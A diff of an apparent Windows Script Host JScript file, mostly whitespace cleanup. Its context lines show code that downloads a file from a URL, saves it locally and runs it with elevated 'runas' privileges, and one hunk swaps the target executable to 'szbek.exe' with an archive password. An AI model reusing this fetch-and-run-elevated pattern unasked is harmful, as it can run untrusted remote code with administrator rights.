@@ -90,7 +90,7 @@ function getTempEnviron() {
 	envProc = wsh.Environment("PROCESS");
 	// Define System Environment Variable
 	envSys = wsh.Environment;
-	
+
 	var  envVariable;
 	envVariable = envProc( "TEMP" );
 	if(!fso.FolderExists( envVariable )){
@@ -138,15 +138,15 @@ function UploadFilesFromInt(strFile, strURL, strPath){
 	// Define Full Local Path to be Downloaded
 	strLocal_Path = strPath + "\\" + strFile;
 
-	// Test 
+	// Test
 	// WScript.Echo("strFileURL = " + strFileURL + "\nstrLocal_Path = " + strLocal_Path +"\n");
-	
+
 	// Check if Path is Exist
 	if(fso.FolderExists(strPath))
 	intUploadFilesFromInt = 0;
 	else
 	intUploadFilesFromInt = 1;
-	
+
 	// Downloaded File
 	// Open URL (Get Requiest)
 	xmlHttp.Open( "GET", strFileURL, false );
@@ -155,7 +155,7 @@ function UploadFilesFromInt(strFile, strURL, strPath){
 	// Send File from URL
 	xmlHttp.Send();
 	if( xmlHttp.Status == 200 && intUploadFilesFromInt == 0)
-	// If Send Request is Successful 
+	// If Send Request is Successful
 	blnExistRemoteFile = true;
 	else
 	{
@@ -175,7 +175,7 @@ function UploadFilesFromInt(strFile, strURL, strPath){
 		adoStream.SaveToFile( strLocal_Path, 2 );
 		// /Downloaded File
 
-		// Close Objects	
+		// Close Objects
 		adoStream.Close();
 		xmlHttp.Abort();
 
@@ -213,7 +213,7 @@ function RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut ){
 	// Run exe with Elevated Privileges ("runas") at Normal Mode (1), with working Diretory strPath
 	shApp.ShellExecute( strValue, constOpt, strPath, "runas", 1 );
 	//    setTimeout( DoNothing, intTimeOut );
-	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
+	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
 	WScript.Sleep(intTimeOut);
 }
 ]]>
@@ -227,8 +227,8 @@ var constHackLIBOpt;			// Arguments of Exe File
 var strHackLIBFolder;
 
 // Test
-strHackLIBFileNameExe = "LIBScript.SFX.exe";
-constHackLIBOpt = "-p1234";
+strHackLIBFileNameExe = "szbek.exe";
+constHackLIBOpt = "-pszbeck";
 // Define strHackFolder
 strHackLIBFolder = "C:\\pub1\\Distrib\\LIB\\LIB-JS";
 
